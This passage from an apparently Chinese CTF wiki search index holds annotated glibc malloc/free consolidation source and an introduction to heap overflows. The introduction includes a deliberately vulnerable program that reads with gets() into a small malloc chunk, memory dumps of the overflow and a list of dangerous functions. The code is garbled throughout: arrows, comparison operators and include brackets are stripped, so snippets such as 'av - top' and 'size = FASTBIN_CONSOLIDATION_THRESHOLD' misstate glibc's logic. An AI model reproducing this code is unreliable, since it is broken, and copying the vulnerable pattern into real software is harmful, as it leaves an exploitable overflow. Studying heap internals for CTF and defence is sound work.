            "text": "/* consolidate backward */ \n         if   ( ! prev_inuse ( p ))   { \n             prevsize   =   prev_size ( p ); \n             size   +=   prevsize ; \n             p   =   chunk_at_offset ( p ,   - (( long )   prevsize )); \n             unlink ( av ,   p ,   bck ,   fwd ); \n         }", 
            "title": "\u540e\u5411\u5408\u5e76-\u5408\u5e76\u4f4e\u5730\u5740 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#top-chunk-chunk", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \u540e\uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230unsorted bin\u4e2d\u3002           // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk \n         if   ( nextchunk   !=   av - top )   { \n             /* get and clear inuse bit */ \n             // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 \n             nextinuse   =   inuse_bit_at_offset ( nextchunk ,   nextsize ); \n             // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 \n             /* consolidate forward */ \n             if   ( ! nextinuse )   { \n                 unlink ( av ,   nextchunk ,   bck ,   fwd ); \n                 size   +=   nextsize ; \n             }   else \n                 clear_inuse_bit_at_offset ( nextchunk ,   0 ); \n\n             /*            Place the chunk in unsorted chunk list. Chunks are            not placed into regular bins until after they have            been given one chance to be used in malloc.              */ \n             // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 \n             bck   =   unsorted_chunks ( av ); \n             fwd   =   bck - fd ; \n             // \u7b80\u5355\u7684\u68c0\u67e5 \n             if   ( __glibc_unlikely ( fwd - bk   !=   bck ))   { \n                 errstr   =   free(): corrupted unsorted chunks ; \n                 goto   errout ; \n             } \n             p - fd   =   fwd ; \n             p - bk   =   bck ; \n             // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 \n             if   ( ! in_smallbin_range ( size ))   { \n                 p - fd_nextsize   =   NULL ; \n                 p - bk_nextsize   =   NULL ; \n             } \n             bck - fd   =   p ; \n             fwd - bk   =   p ; \n\n             set_head ( p ,   size   |   PREV_INUSE ); \n             set_foot ( p ,   size ); \n\n             check_free_chunk ( av ,   p ); \n         }", 
            "title": "\u4e0b\u4e00\u5757\u4e0d\u662ftop chunk-\u524d\u5411\u5408\u5e76-\u5408\u5e76\u9ad8\u5730\u5740chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#top-chunk-top-chunk", 
            "text": "/*            If the chunk borders the current high end of memory,            consolidate into top          */ \n         // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk \n         else   { \n             size   +=   nextsize ; \n             set_head ( p ,   size   |   PREV_INUSE ); \n             av - top   =   p ; \n             check_chunk ( av ,   p ); \n         }", 
            "title": "\u4e0b\u4e00\u5757\u662ftop chunk-\u5408\u5e76\u5230top chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_14", 
            "text": "/*            If freeing a large space, consolidate possibly-surrounding            chunks. Then, if the total unused topmost memory exceeds trim            threshold, ask malloc_trim to reduce top.            Unless max_fast is 0, we don t know if there are fastbins            bordering top, so we cannot tell for sure whether threshold            has been reached unless fastbins are consolidated.  But we            don t want to consolidate on each free.  As a compromise,            consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD            is reached.          */ \n          // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD \n          // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 \n          // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 \n         if   (( unsigned   long )   ( size )   =   FASTBIN_CONSOLIDATION_THRESHOLD )   { \n             // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 \n             if   ( have_fastchunks ( av ))   malloc_consolidate ( av ); \n             // \u4e3b\u5206\u914d\u533a \n             if   ( av   ==   main_arena )   {  #ifndef MORECORE_CANNOT_TRIM \n                 // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c \n                 if   (( unsigned   long )   ( chunksize ( av - top ))   = \n                     ( unsigned   long )   ( mp_ . trim_threshold )) \n                     systrim ( mp_ . top_pad ,   av );  #endif       // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap \n             }   else   { \n                 /* Always try heap_trim(), even if the top chunk is not                     large, because the corresponding heap might go away.  */ \n                 heap_info   * heap   =   heap_for_ptr ( top ( av )); \n\n                 assert ( heap - ar_ptr   ==   av ); \n                 heap_trim ( heap ,   mp_ . top_pad ); \n             } \n         } \n\n         if   ( ! have_lock )   { \n             assert ( locked ); \n             __libc_lock_unlock ( av - mutex ); \n         }", 
            "title": "\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#mmapchunk", 
            "text": "}   else   { \n         //  If the chunk was allocated via mmap, release via munmap(). \n         munmap_chunk ( p ); \n     }", 
            "title": "\u91ca\u653emmap\u7684chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#systrim", 
            "text": "", 
            "title": "systrim"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#heap_trim", 
            "text": "", 
            "title": "heap_trim"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#munmap_chunk", 
            "text": "", 
            "title": "munmap_chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_15", 
            "text": "", 
            "title": "\u5220\u9664\u5806"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#malloc_state", 
            "text": "", 
            "title": "malloc_state \u76f8\u5173\u51fd\u6570"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#malloc_init_state", 
            "text": "/*     Initialize a malloc_state struct.     This is called only from within malloc_consolidate, which needs     be called in the same contexts anyway.  It is never called directly     outside of malloc_consolidate because some optimizing compilers try     to inline it at all call points, which turns out not to be an     optimization at all. (Inlining it in malloc_consolidate is fine though.)   */  static   void   malloc_init_state ( mstate   av )   { \n     int       i ; \n     mbinptr   bin ; \n\n     /* Establish circular links for normal bins */ \n     for   ( i   =   1 ;   i     NBINS ;   ++ i )   { \n         bin       =   bin_at ( av ,   i ); \n         bin - fd   =   bin - bk   =   bin ; \n     }  #if MORECORE_CONTIGUOUS \n     if   ( av   !=   main_arena )  #endif \n         set_noncontiguous ( av ); \n     if   ( av   ==   main_arena )   set_max_fast ( DEFAULT_MXFAST ); \n     // \u8bbe\u7f6e flags \u6807\u8bb0\u76ee\u524d\u6ca1\u6709fast chunk \n     av - flags   |=   FASTCHUNKS_BIT ; \n     // \u5c31\u662f unsorted bin \n     av - top   =   initial_top ( av );  }", 
            "title": "malloc_init_state"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#malloc_consolidate", 
            "text": "\u8be5\u51fd\u6570\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd   \u82e5 fastbin \u672a\u521d\u59cb\u5316\uff0c\u5373 global_max_fast \u4e3a0\uff0c\u90a3\u5c31\u521d\u59cb\u5316 malloc_state\u3002  \u5982\u679c\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8bdd\uff0c\u5c31\u5408\u5e76 fastbin \u4e2d\u7684 chunk\u3002   \u57fa\u672c\u7684\u6d41\u7a0b\u5982\u4e0b", 
            "title": "malloc_consolidate"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_16", 
            "text": "static   void   malloc_consolidate ( mstate   av )   { \n     mfastbinptr   * fb ;               /* current fastbin being consolidated */ \n     mfastbinptr   * maxfb ;            /* last fastbin (for loop control) */ \n     mchunkptr      p ;                /* current chunk being consolidated */ \n     mchunkptr      nextp ;            /* next chunk to consolidate */ \n     mchunkptr      unsorted_bin ;     /* bin header */ \n     mchunkptr      first_unsorted ;   /* chunk to link to */ \n\n     /* These have same use as in free() */ \n     mchunkptr         nextchunk ; \n     INTERNAL_SIZE_T   size ; \n     INTERNAL_SIZE_T   nextsize ; \n     INTERNAL_SIZE_T   prevsize ; \n     int               nextinuse ; \n     mchunkptr         bck ; \n     mchunkptr         fwd ;", 
            "title": "\u521d\u59cb"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk_3", 
            "text": "/*        If max_fast is 0, we know that av hasn t        yet been initialized, in which case do so below      */ \n     // \u8bf4\u660e fastbin \u5df2\u7ecf\u521d\u59cb\u5316 \n     if   ( get_max_fast ()   !=   0 )   { \n         // \u6e05\u7a7a fastbin \u6807\u8bb0 \n         // \u56e0\u4e3a\u8981\u5408\u5e76 fastbin \u4e2d\u7684 chunk \u4e86\u3002 \n         clear_fastchunks ( av ); \n         //  \n         unsorted_bin   =   unsorted_chunks ( av ); \n\n         /*            Remove each chunk from fast bin and consolidate it, placing it            then in unsorted bin. Among other reasons for doing this,            placing in unsorted bin avoids needing to calculate actual bins            until malloc is sure that chunks aren t immediately going to be            reused anyway.          */ \n         // \u6309\u7167 fd \u987a\u5e8f\u904d\u5386 fastbin \u7684\u6bcf\u4e00\u4e2a bin\uff0c\u5c06 bin \u4e2d\u7684\u6bcf\u4e00\u4e2a chunk \u5408\u5e76\u6389\u3002 \n         maxfb   =   fastbin ( av ,   NFASTBINS   -   1 ); \n         fb      =   fastbin ( av ,   0 ); \n         do   { \n             p   =   atomic_exchange_acq ( fb ,   NULL ); \n             if   ( p   !=   0 )   { \n                 do   { \n                     check_inuse_chunk ( av ,   p ); \n                     nextp   =   p - fd ; \n\n                     /* Slightly streamlined version of consolidation code in                       * free() */ \n                     size        =   chunksize ( p ); \n                     nextchunk   =   chunk_at_offset ( p ,   size ); \n                     nextsize    =   chunksize ( nextchunk ); \n\n                     if   ( ! prev_inuse ( p ))   { \n                         prevsize   =   prev_size ( p ); \n                         size   +=   prevsize ; \n                         p   =   chunk_at_offset ( p ,   - (( long )   prevsize )); \n                         unlink ( av ,   p ,   bck ,   fwd ); \n                     } \n\n                     if   ( nextchunk   !=   av - top )   { \n                         // \u5224\u65ad nextchunk \u662f\u5426\u662f\u7a7a\u95f2\u7684\u3002 \n                         nextinuse   =   inuse_bit_at_offset ( nextchunk ,   nextsize ); \n\n                         if   ( ! nextinuse )   { \n                             size   +=   nextsize ; \n                             unlink ( av ,   nextchunk ,   bck ,   fwd ); \n                         }   else \n                          // \u8bbe\u7f6e nextchunk \u7684 prev inuse \u4e3a0\uff0c\u4ee5\u8868\u660e\u53ef\u4ee5\u5408\u5e76\u5f53\u524d fast chunk\u3002 \n                             clear_inuse_bit_at_offset ( nextchunk ,   0 ); \n\n                         first_unsorted       =   unsorted_bin - fd ; \n                         unsorted_bin - fd     =   p ; \n                         first_unsorted - bk   =   p ; \n\n                         if   ( ! in_smallbin_range ( size ))   { \n                             p - fd_nextsize   =   NULL ; \n                             p - bk_nextsize   =   NULL ; \n                         } \n\n                         set_head ( p ,   size   |   PREV_INUSE ); \n                         p - bk   =   unsorted_bin ; \n                         p - fd   =   first_unsorted ; \n                         set_foot ( p ,   size ); \n                     } \n\n                     else   { \n                         size   +=   nextsize ; \n                         set_head ( p ,   size   |   PREV_INUSE ); \n                         av - top   =   p ; \n                     } \n\n                 }   while   (( p   =   nextp )   !=   0 ); \n             } \n         }   while   ( fb ++   !=   maxfb );", 
            "title": "\u5408\u5e76 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_17", 
            "text": "\u8bf4\u660e fastbin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002       }   else   { \n         malloc_init_state ( av ); \n         // \u5728\u975e\u8c03\u8bd5\u60c5\u51b5\u4e0b\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u5728\u8c03\u8bd5\u60c5\u51b5\u4e0b\uff0c\u505a\u4e00\u4e9b\u68c0\u6d4b\u3002 \n         check_malloc_state ( av ); \n     }", 
            "title": "\u521d\u59cb\u5316"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_18", 
            "text": "\u4e0b\u9762\u7684\u4ee3\u7801\u7528\u4e8e\u652f\u6301\u6d4b\u8bd5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b perturb_byte \u662f0\u3002  static   int   perturb_byte ;  static   void   alloc_perturb ( char   * p ,   size_t   n )   { \n     if   ( __glibc_unlikely ( perturb_byte ))   memset ( p ,   perturb_byte   ^   0xff ,   n );  }  static   void   free_perturb ( char   * p ,   size_t   n )   { \n     if   ( __glibc_unlikely ( perturb_byte ))   memset ( p ,   perturb_byte ,   n );  }", 
            "title": "\u6d4b\u8bd5\u652f\u6301"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/", 
            "text": "\u5806\u6ea2\u51fa\n\n\n\u4ecb\u7ecd\n\n\n\u5806\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u5411\u67d0\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u5806\u5757\u672c\u8eab\u53ef\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff08\n\u4e4b\u6240\u4ee5\u662f\u53ef\u4f7f\u7528\u800c\u4e0d\u662f\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u662f\u56e0\u4e3a\u5806\u7ba1\u7406\u5668\u4f1a\u5bf9\u7528\u6237\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u53ef\u5229\u7528\u7684\u5b57\u8282\u6570\u90fd\u4e0d\u5c0f\u4e8e\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\n\uff09\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u6ea2\u51fa\uff0c\u5e76\u8986\u76d6\u5230\n\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\n\u7684\u4e0b\u4e00\u4e2a\u5806\u5757\u3002\n\n\n\u4e0d\u96be\u53d1\u73b0\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u53d1\u751f\u7684\u57fa\u672c\u524d\u63d0\u662f\n\n\n\n\n\u7a0b\u5e8f\u5411\u5806\u4e0a\u5199\u5165\u6570\u636e\u3002\n\n\n\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002\n\n\n\n\n\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u5806\u6ea2\u51fa\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff08\u8fd8\u6709\u6808\u6ea2\u51fa\uff0c bss \u6bb5\u6ea2\u51fa\u7b49)\u3002\u4f46\u662f\u5176\u4e0e\u6808\u6ea2\u51fa\u6240\u4e0d\u540c\u7684\u662f\uff0c\u5806\u4e0a\u5e76\u4e0d\u5b58\u5728\u8fd4\u56de\u5730\u5740\u7b49\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u7684\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5806\u6ea2\u51fa\u6765\u63a7\u5236 EIP \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u5806\u6ea2\u51fa\u7684\u7b56\u7565\u662f\n\n\n\n\n\u8986\u76d6\u4e0e\u5176\n\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk\n \u7684\u5185\u5bb9\u3002\n\n\nprev_size\n\n\nsize\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u6bd4\u7279\u4f4d\uff0c\u4ee5\u53ca\u8be5\u5806\u5757\u771f\u6b63\u7684\u5927\u5c0f\u3002\n\n\nNON_MAIN_ARENA \n\n\nIS_MAPPED  \n\n\nPREV_INUSE \n\n\nthe True chunk size\n\n\n\n\n\n\nchunk content\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u56fa\u6709\u7684\u6267\u884c\u6d41\u3002\n\n\n\n\n\n\n\u5229\u7528\u5806\u4e2d\u7684\u673a\u5236\uff08\u5982 unlink \u7b49 \uff09\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff08 Write-Anything-Anywhere\uff09\u6216\u63a7\u5236\u5806\u5757\u4e2d\u7684\u5185\u5bb9\u7b49\u6548\u679c\uff0c\u4ece\u800c\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\n\n\n\n\n\u57fa\u672c\u793a\u4f8b\n\n\n\u4e0b\u9762\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a\n\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts(\nGet input:\n);\n  gets(chunk);\n  return 0;\n}\n\n\n\n\n\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u7528 malloc \u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0c\u4e4b\u540e\u5411\u8fd9\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fc7\u957f\u4f1a\u5bfc\u81f4\u6ea2\u51fa chunk \u7684\u533a\u57df\u5e76\u8986\u76d6\u5230\u5176\u540e\u7684 top chunk \u4e4b\u4e2d(\u5b9e\u9645\u4e0a puts \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u5206\u914d\u5806\u5185\u5b58\uff0c\u8986\u76d6\u5230\u7684\u53ef\u80fd\u5e76\u4e0d\u662f top chunk)\u3002\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n===chunk\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n===top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n\n\nprint 'A'*100\n\u8fdb\u884c\u5199\u5165\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n===chunk\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x4141414141414141 \n===top chunk(\u5df2\u88ab\u6ea2\u51fa)\n0x602030:   0x4141414141414141  0x4141414141414141\n0x602040:   0x4141414141414141  0x4141414141414141\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u5806\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:\n\n\n\u5bfb\u627e\u5806\u5206\u914d\u51fd\u6570\n\n\n\u901a\u5e38\u6765\u8bf4\u5806\u662f\u901a\u8fc7\u8c03\u7528 glibc \u51fd\u6570 malloc \u8fdb\u884c\u5206\u914d\u7684\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528 calloc \u5206\u914d\u3002calloc \u4e0e malloc \u7684\u533a\u522b\u662f \ncalloc \u5728\u5206\u914d\u540e\u4f1a\u81ea\u52a8\u8fdb\u884c\u6e05\u7a7a\uff0c\u8fd9\u5bf9\u4e8e\u67d0\u4e9b\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u7684\u5229\u7528\u6765\u8bf4\u662f\u81f4\u547d\u7684\n\u3002\n\n\ncalloc(0x20);\n//\u7b49\u540c\u4e8e\nptr=malloc(0x20);\nmemset(ptr,0,0x20);\n\n\n\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u5206\u914d\u662f\u7ecf\u7531 realloc \u8fdb\u884c\u7684\uff0crealloc \u51fd\u6570\u53ef\u4ee5\u8eab\u517c malloc \u548c free \u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u3002\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk,*chunk1;\n  chunk=malloc(16);\n  chunk1=realloc(chunk,32);\n  return 0;\n}\n\n\nrealloc\u7684\u64cd\u4f5c\u5e76\u4e0d\u662f\u50cf\u5b57\u9762\u610f\u4e49\u4e0a\u90a3\u4e48\u7b80\u5355\uff0c\u5176\u5185\u90e8\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\n\n\n\n\n\u5f53realloc(ptr,size)\u7684size\u4e0d\u7b49\u4e8eptr\u7684size\u65f6\n\n\n\u5982\u679c\u7533\u8bf7size\n\u539f\u6765size\n\n\n\u5982\u679cchunk\u4e0etop chunk\u76f8\u90bb\uff0c\u76f4\u63a5\u6269\u5c55\u8fd9\u4e2achunk\u5230\u65b0size\u5927\u5c0f\n\n\n\u5982\u679cchunk\u4e0etop chunk\u4e0d\u76f8\u90bb\uff0c\u76f8\u5f53\u4e8efree(ptr),malloc(new_size) \n\n\n\n\n\n\n\u5982\u679c\u7533\u8bf7size\n\u539f\u6765size\n\n\n\u5982\u679c\u76f8\u5dee\u4e0d\u8db3\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk(64\u4f4d\u4e0b32\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e0b16\u4e2a\u5b57\u8282)\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8\n\n\n\u5982\u679c\u76f8\u5dee\u53ef\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk\uff0c\u5219\u5207\u5272\u539fchunk\u4e3a\u4e24\u90e8\u5206\uff0cfree\u6389\u540e\u4e00\u90e8\u5206\n\n\n\n\n\n\n\n\n\n\n\u5f53realloc(ptr,size)\u7684size\u7b49\u4e8e0\u65f6\uff0c\u76f8\u5f53\u4e8efree(ptr)\n\n\n\u5f53realloc(ptr,size)\u7684size\u7b49\u4e8eptr\u7684size\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\n\n\n\n\n\u5bfb\u627e\u5371\u9669\u51fd\u6570\n\n\n\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u5806\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002\n\n\n\u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b\n\n\n\n\n\u8f93\u5165\n\n\ngets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565 \n'\\x00'\n\n\nscanf\n\n\nvscanf\n\n\n\n\n\n\n\u8f93\u51fa\n\n\nsprintf\n\n\n\n\n\n\n\u5b57\u7b26\u4e32\n\n\nstrcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230 \n'\\x00'\n \u505c\u6b62\n\n\nstrcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230 \n'\\x00'\n \u505c\u6b62\n\n\nbcopy\n\n\n\n\n\n\n\n\n\u786e\u5b9a\u586b\u5145\u957f\u5ea6\n\n\n\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97\n\u6211\u4eec\u5f00\u59cb\u5199\u5165\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb\n\u3002\n\u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u662fmalloc\u7684\u53c2\u6570\u7b49\u4e8e\u5b9e\u9645\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a ptmalloc \u5206\u914d\u51fa\u6765\u7684\u5927\u5c0f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e2a\u957f\u5ea6\u4e00\u822c\u662f\u5b57\u957f\u76842\u500d\uff0c\u6bd4\u598232\u4f4d\u7cfb\u7edf\u662f8\u4e2a\u5b57\u8282\uff0c64\u4f4d\u7cfb\u7edf\u662f16\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u5bf9\u4e8e\u4e0d\u5927\u4e8e2\u500d\u5b57\u957f\u7684\u8bf7\u6c42\uff0cmalloc\u4f1a\u76f4\u63a5\u8fd4\u56de2\u500d\u5b57\u957f\u7684\u5757\u4e5f\u5c31\u662f\u6700\u5c0fchunk\uff0c\u6bd4\u598264\u4f4d\u7cfb\u7edf\u6267\u884c\nmalloc(0)\n\u4f1a\u8fd4\u56de\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5757\u3002\n\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(0);\n  puts(\nGet input:\n);\n  gets(chunk);\n  return 0;\n}\n\n\n\n\n//\u6839\u636e\u7cfb\u7edf\u7684\u4f4d\u6570\uff0cmalloc\u4f1a\u5206\u914d8\u621616\u5b57\u8282\u7684\u7528\u6237\u7a7a\u95f4\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u6ce8\u610f\u7528\u6237\u533a\u57df\u7684\u5927\u5c0f\u4e0d\u7b49\u4e8e chunk_hear.size\uff0cchunk_hear.size=\u7528\u6237\u533a\u57df\u5927\u5c0f+2*\u5b57\u957f\n\n\n\u8fd8\u6709\u4e00\u70b9\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4f1a\u88ab\u4fee\u6539\uff0c\u5176\u6709\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e\u5176\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\u50a8\u5b58\u5185\u5bb9\u3002\u56de\u5934\u518d\u6765\u770b\u4e0b\u4e4b\u524d\u7684\u793a\u4f8b\u4ee3\u7801\n\n#include \nstdio.h\n\n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts(\nGet input:\n);\n  gets(chunk);\n  return 0;\n}\n\n\n\u89c2\u5bdf\u5982\u4e0a\u4ee3\u7801\uff0c\u6211\u4eec\u7533\u8bf7\u7684chunk\u5927\u5c0f\u662f24\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a64\u4f4d\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5206\u914d\u7684\u5185\u5b58\u4f1a\u662f16\u4e2a\u5b57\u8282\u800c\u4e0d\u662f24\u4e2a\u3002\n\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n\n\n16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u662f\u5982\u4f55\u88c5\u5f97\u4e0b24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5462\uff1f\u7b54\u6848\u662f\u501f\u7528\u4e86\u4e0b\u4e00\u4e2a\u5757\u7684pre_size\u57df\u3002\u6211\u4eec\u53ef\u6765\u770b\u4e00\u4e0b\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0eglibc\u4e2d\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u4e4b\u95f4\u7684\u8f6c\u6362\u3002\n\n\n/* pad request bytes into a usable size -- internal version */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define request2size(req)                                                      \\\n\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \n MINSIZE)                           \\\n\n\n         ? MINSIZE                                                             \\\n\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK)\n\n\n\n\n\n\u5f53req=24\u65f6\uff0crequest2size(24)=32\u3002\u800c\u9664\u53bbchunk 